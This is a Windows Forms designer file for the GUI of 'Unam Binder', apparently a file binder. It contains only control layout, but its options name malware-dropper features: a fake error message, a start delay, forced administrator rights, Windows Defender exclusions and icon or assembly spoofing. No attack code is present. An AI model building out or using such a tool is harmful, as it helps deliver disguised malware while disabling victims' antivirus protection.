namespace UnamBinder
{
    partial class Builder
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Builder));
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.formBuilder = new MephTheme();
            this.radioBuildManaged = new MephRadioButton();
            this.radioBuildNative = new MephRadioButton();
            this.labelBuilderBuildType = new System.Windows.Forms.Label();
            this.comboErrorType = new MephComboBox();
            this.txtErrorText = new MephTextBox();
            this.btnSave = new MephButton();
            this.btnLoad = new MephButton();
            this.chkError = new MephCheckBox();
            this.labelDelay = new System.Windows.Forms.Label();
            this.txtDelay = new MephTextBox();
            this.chkDelay = new MephCheckBox();
            this.btnVanity = new MephButton();
            this.imageAdmin1 = new System.Windows.Forms.PictureBox();
            this.linkGitHub = new System.Windows.Forms.LinkLabel();
            this.btnBuild = new MephButton();
            this.chkWD = new MephCheckBox();
            this.chkAdmin = new MephCheckBox();
            this.btnEdit = new MephButton();
            this.btnRemove = new MephButton();
            this.btnAdd = new MephButton();
            this.labelBuilderFiles = new System.Windows.Forms.Label();
            this.listFiles = new MephListBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.formBuilder.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.imageAdmin1)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(287, 339);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(24, 25);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 7;
            this.pictureBox1.TabStop = false;
            // 
            // formBuilder
            // 
            this.formBuilder.AccentColor = System.Drawing.Color.Indigo;
            this.formBuilder.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formBuilder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formBuilder.Controls.Add(this.radioBuildManaged);
            this.formBuilder.Controls.Add(this.radioBuildNative);
            this.formBuilder.Controls.Add(this.labelBuilderBuildType);
            this.formBuilder.Controls.Add(this.comboErrorType);
            this.formBuilder.Controls.Add(this.txtErrorText);
            this.formBuilder.Controls.Add(this.btnSave);
            this.formBuilder.Controls.Add(this.btnLoad);
            this.formBuilder.Controls.Add(this.chkError);
            this.formBuilder.Controls.Add(this.labelDelay);
            this.formBuilder.Controls.Add(this.txtDelay);
            this.formBuilder.Controls.Add(this.chkDelay);
            this.formBuilder.Controls.Add(this.btnVanity);
            this.formBuilder.Controls.Add(this.imageAdmin1);
            this.formBuilder.Controls.Add(this.linkGitHub);
            this.formBuilder.Controls.Add(this.btnBuild);
            this.formBuilder.Controls.Add(this.chkWD);
            this.formBuilder.Controls.Add(this.chkAdmin);
            this.formBuilder.Controls.Add(this.btnEdit);
            this.formBuilder.Controls.Add(this.btnRemove);
            this.formBuilder.Controls.Add(this.btnAdd);
            this.formBuilder.Controls.Add(this.labelBuilderFiles);
            this.formBuilder.Controls.Add(this.listFiles);
            this.formBuilder.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.formBuilder.Location = new System.Drawing.Point(0, 0);
            this.formBuilder.Margin = new System.Windows.Forms.Padding(4);
            this.formBuilder.MaximumSize = new System.Drawing.Size(348, 475);
            this.formBuilder.MinimumSize = new System.Drawing.Size(348, 475);
            this.formBuilder.Name = "formBuilder";
            this.formBuilder.Size = new System.Drawing.Size(348, 475);
            this.formBuilder.SubHeader = "Created by Unam Sanctam";
            this.formBuilder.TabIndex = 0;
            this.formBuilder.Text = "Unam Binder 1.3.0";
            // 
            // radioBuildManaged
            // 
            this.radioBuildManaged.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.radioBuildManaged.BackColor = System.Drawing.Color.Transparent;
            this.radioBuildManaged.Checked = false;
            this.radioBuildManaged.ForeColor = System.Drawing.Color.Black;
            this.radioBuildManaged.Location = new System.Drawing.Point(169, 236);
            this.radioBuildManaged.Name = "radioBuildManaged";
            this.radioBuildManaged.Size = new System.Drawing.Size(158, 24);
            this.radioBuildManaged.TabIndex = 33;
            this.radioBuildManaged.Text = "Managed (.NET C#)";
            // 
            // radioBuildNative
            // 
            this.radioBuildNative.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.radioBuildNative.BackColor = System.Drawing.Color.Transparent;
            this.radioBuildNative.Checked = true;
            this.radioBuildNative.ForeColor = System.Drawing.Color.Black;
            this.radioBuildNative.Location = new System.Drawing.Point(24, 236);
            this.radioBuildNative.Name = "radioBuildNative";
            this.radioBuildNative.Size = new System.Drawing.Size(150, 24);
            this.radioBuildNative.TabIndex = 32;
            this.radioBuildNative.Text = "Native (C)";
            // 
            // labelBuilderBuildType
            // 
            this.labelBuilderBuildType.AutoSize = true;
            this.labelBuilderBuildType.BackColor = System.Drawing.Color.Transparent;
            this.labelBuilderBuildType.ForeColor = System.Drawing.Color.Gray;
            this.labelBuilderBuildType.Location = new System.Drawing.Point(21, 215);
            this.labelBuilderBuildType.Name = "labelBuilderBuildType";
            this.labelBuilderBuildType.Size = new System.Drawing.Size(70, 17);
            this.labelBuilderBuildType.TabIndex = 31;
            this.labelBuilderBuildType.Text = "Build Type:";
            // 
            // comboErrorType
            // 
            this.comboErrorType.BackColor = System.Drawing.Color.Transparent;
            this.comboErrorType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboErrorType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboErrorType.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboErrorType.ForeColor = System.Drawing.Color.Silver;
            this.comboErrorType.FormattingEnabled = true;
            this.comboErrorType.ItemHeight = 16;
            this.comboErrorType.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboErrorType.Items.AddRange(new object[] {
            "Error",
            "Warning",
            "Info",
            "Question"});
            this.comboErrorType.Location = new System.Drawing.Point(249, 300);
            this.comboErrorType.Name = "comboErrorType";
            this.comboErrorType.Size = new System.Drawing.Size(75, 22);
            this.comboErrorType.StartIndex = 0;
            this.comboErrorType.TabIndex = 30;
            this.comboErrorType.Visible = false;
            // 
            // txtErrorText
            // 
            this.txtErrorText.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtErrorText.ForeColor = System.Drawing.Color.Silver;
            this.txtErrorText.Location = new System.Drawing.Point(138, 300);
            this.txtErrorText.MaxLength = 32767;
            this.txtErrorText.MultiLine = false;
            this.txtErrorText.Name = "txtErrorText";
            this.txtErrorText.Size = new System.Drawing.Size(105, 24);
            this.txtErrorText.TabIndex = 29;
            this.txtErrorText.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtErrorText.UseSystemPasswordChar = false;
            this.txtErrorText.Visible = false;
            this.txtErrorText.WordWrap = false;
            // 
            // btnSave
            // 
            this.btnSave.BackColor = System.Drawing.Color.Transparent;
            this.btnSave.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSave.Location = new System.Drawing.Point(227, 428);
            this.btnSave.Name = "btnSave";
            this.btnSave.Size = new System.Drawing.Size(43, 23);
            this.btnSave.TabIndex = 28;
            this.btnSave.Text = "Save";
            this.btnSave.Click += new System.EventHandler(this.btnSave_Click);
            // 
            // btnLoad
            // 
            this.btnLoad.BackColor = System.Drawing.Color.Transparent;
            this.btnLoad.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnLoad.Location = new System.Drawing.Point(276, 428);
            this.btnLoad.Name = "btnLoad";
            this.btnLoad.Size = new System.Drawing.Size(48, 23);
            this.btnLoad.TabIndex = 27;
            this.btnLoad.Text = "Load";
            this.btnLoad.Click += new System.EventHandler(this.btnLoad_Click);
            // 
            // chkError
            // 
            this.chkError.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.chkError.BackColor = System.Drawing.Color.Transparent;
            this.chkError.Checked = false;
            this.chkError.ForeColor = System.Drawing.Color.Black;
            this.chkError.Location = new System.Drawing.Point(25, 300);
            this.chkError.Name = "chkError";
            this.chkError.Size = new System.Drawing.Size(107, 24);
            this.chkError.TabIndex = 18;
            this.chkError.Text = "Fake Error";
            this.chkError.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.checkError_CheckedChanged);
            // 
            // labelDelay
            // 
            this.labelDelay.AutoSize = true;
            this.labelDelay.BackColor = System.Drawing.Color.Transparent;
            this.labelDelay.ForeColor = System.Drawing.Color.Gray;
            this.labelDelay.Location = new System.Drawing.Point(167, 333);
            this.labelDelay.Name = "labelDelay";
            this.labelDelay.Size = new System.Drawing.Size(64, 17);
            this.labelDelay.TabIndex = 17;
            this.labelDelay.Text = "second(s)";
            this.labelDelay.Visible = false;
            // 
            // txtDelay
            // 
            this.txtDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtDelay.ForeColor = System.Drawing.Color.Silver;
            this.txtDelay.Location = new System.Drawing.Point(138, 330);
            this.txtDelay.MaxLength = 32767;
            this.txtDelay.MultiLine = false;
            this.txtDelay.Name = "txtDelay";
            this.txtDelay.Size = new System.Drawing.Size(30, 24);
            this.txtDelay.TabIndex = 16;
            this.txtDelay.Text = "0";
            this.txtDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtDelay.UseSystemPasswordChar = false;
            this.txtDelay.Visible = false;
            this.txtDelay.WordWrap = false;
            // 
            // chkDelay
            // 
            this.chkDelay.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.chkDelay.BackColor = System.Drawing.Color.Transparent;
            this.chkDelay.Checked = false;
            this.chkDelay.ForeColor = System.Drawing.Color.Black;
            this.chkDelay.Location = new System.Drawing.Point(25, 330);
            this.chkDelay.Name = "chkDelay";
            this.chkDelay.Size = new System.Drawing.Size(107, 24);
            this.chkDelay.TabIndex = 15;
            this.chkDelay.Text = "Start Delay";
            this.chkDelay.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.checkDelay_CheckedChanged);
            // 
            // btnVanity
            // 
            this.btnVanity.BackColor = System.Drawing.Color.Transparent;
            this.btnVanity.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnVanity.Location = new System.Drawing.Point(83, 428);
            this.btnVanity.Name = "btnVanity";
            this.btnVanity.Size = new System.Drawing.Size(138, 23);
            this.btnVanity.TabIndex = 14;
            this.btnVanity.Text = "Change Icon/Assembly";
            this.btnVanity.Click += new System.EventHandler(this.btnVanity_Click);
            // 
            // imageAdmin1
            // 
            this.imageAdmin1.BackColor = System.Drawing.Color.Transparent;
            this.imageAdmin1.Image = global::UnamBinder.Properties.Resources.microsoft_admin;
            this.imageAdmin1.Location = new System.Drawing.Point(284, 389);
            this.imageAdmin1.Name = "imageAdmin1";
            this.imageAdmin1.Size = new System.Drawing.Size(24, 24);
            this.imageAdmin1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.imageAdmin1.TabIndex = 13;
            this.imageAdmin1.TabStop = false;
            // 
            // linkGitHub
            // 
            this.linkGitHub.AutoSize = true;
            this.linkGitHub.BackColor = System.Drawing.Color.Transparent;
            this.linkGitHub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.linkGitHub.Location = new System.Drawing.Point(276, 77);
            this.linkGitHub.Name = "linkGitHub";
            this.linkGitHub.Size = new System.Drawing.Size(48, 17);
            this.linkGitHub.TabIndex = 11;
            this.linkGitHub.TabStop = true;
            this.linkGitHub.Text = "GitHub";
            this.linkGitHub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkGitHub_LinkClicked);
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBuild.Location = new System.Drawing.Point(25, 428);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(52, 23);
            this.btnBuild.TabIndex = 8;
            this.btnBuild.Text = "Build";
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // chkWD
            // 
            this.chkWD.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.chkWD.BackColor = System.Drawing.Color.Transparent;
            this.chkWD.Checked = false;
            this.chkWD.ForeColor = System.Drawing.Color.Gray;
            this.chkWD.Location = new System.Drawing.Point(25, 390);
            this.chkWD.Name = "chkWD";
            this.chkWD.Size = new System.Drawing.Size(269, 24);
            this.chkWD.TabIndex = 6;
            this.chkWD.Text = "Add Windows Defender exclusions";
            // 
            // chkAdmin
            // 
            this.chkAdmin.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(128)))), ((int)(((byte)(255)))));
            this.chkAdmin.BackColor = System.Drawing.Color.Transparent;
            this.chkAdmin.Checked = false;
            this.chkAdmin.ForeColor = System.Drawing.Color.Black;
            this.chkAdmin.Location = new System.Drawing.Point(25, 360);
            this.chkAdmin.Name = "chkAdmin";
            this.chkAdmin.Size = new System.Drawing.Size(250, 24);
            this.chkAdmin.TabIndex = 5;
            this.chkAdmin.Text = "Run as Administrator";
            // 
            // btnEdit
            // 
            this.btnEdit.BackColor = System.Drawing.Color.Transparent;
            this.btnEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnEdit.Location = new System.Drawing.Point(138, 175);
            this.btnEdit.Name = "btnEdit";
            this.btnEdit.Size = new System.Drawing.Size(75, 23);
            this.btnEdit.TabIndex = 4;
            this.btnEdit.Text = "Edit";
            this.btnEdit.Click += new System.EventHandler(this.btnEdit_Click);
            // 
            // btnRemove
            // 
            this.btnRemove.BackColor = System.Drawing.Color.Transparent;
            this.btnRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnRemove.Location = new System.Drawing.Point(249, 175);
            this.btnRemove.Name = "btnRemove";
            this.btnRemove.Size = new System.Drawing.Size(75, 23);
            this.btnRemove.TabIndex = 3;
            this.btnRemove.Text = "Remove";
            this.btnRemove.Click += new System.EventHandler(this.btnRemove_Click);
            // 
            // btnAdd
            // 
            this.btnAdd.BackColor = System.Drawing.Color.Transparent;
            this.btnAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAdd.Location = new System.Drawing.Point(25, 175);
            this.btnAdd.Name = "btnAdd";
            this.btnAdd.Size = new System.Drawing.Size(75, 23);
            this.btnAdd.TabIndex = 2;
            this.btnAdd.Text = "Add";
            this.btnAdd.Click += new System.EventHandler(this.btnAdd_Click);
            // 
            // labelBuilderFiles
            // 
            this.labelBuilderFiles.AutoSize = true;
            this.labelBuilderFiles.BackColor = System.Drawing.Color.Transparent;
            this.labelBuilderFiles.ForeColor = System.Drawing.Color.Gray;
            this.labelBuilderFiles.Location = new System.Drawing.Point(22, 77);
            this.labelBuilderFiles.Name = "labelBuilderFiles";
            this.labelBuilderFiles.Size = new System.Drawing.Size(36, 17);
            this.labelBuilderFiles.TabIndex = 1;
            this.labelBuilderFiles.Text = "Files:";
            // 
            // listFiles
            // 
            this.listFiles.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listFiles.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listFiles.ForeColor = System.Drawing.Color.Silver;
            this.listFiles.ItemHeight = 17;
            this.listFiles.Location = new System.Drawing.Point(25, 97);
            this.listFiles.Name = "listFiles";
            this.listFiles.Size = new System.Drawing.Size(299, 72);
            this.listFiles.TabIndex = 0;
            // 
            // Builder
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(348, 475);
            this.Controls.Add(this.formBuilder);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(4);
            this.Name = "Builder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Unam Binder 1.2.1";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.formBuilder.ResumeLayout(false);
            this.formBuilder.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.imageAdmin1)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private MephTheme formBuilder;
        private MephButton btnEdit;
        private MephButton btnRemove;
        private MephButton btnAdd;
        private System.Windows.Forms.Label labelBuilderFiles;
        private System.Windows.Forms.PictureBox pictureBox1;
        private MephButton btnBuild;
        private System.Windows.Forms.LinkLabel linkGitHub;
        public MephListBox listFiles;
        private MephButton btnVanity;
        private MephButton btnSave;
        private MephButton btnLoad;
        private MephRadioButton radioBuildManaged;
        private MephRadioButton radioBuildNative;
        private System.Windows.Forms.Label labelBuilderBuildType;
        private MephComboBox comboErrorType;
        private MephTextBox txtErrorText;
        private MephCheckBox chkError;
        private System.Windows.Forms.Label labelDelay;
        private MephTextBox txtDelay;
        private MephCheckBox chkDelay;
        private System.Windows.Forms.PictureBox imageAdmin1;
        private MephCheckBox chkWD;
        private MephCheckBox chkAdmin;
    }
}

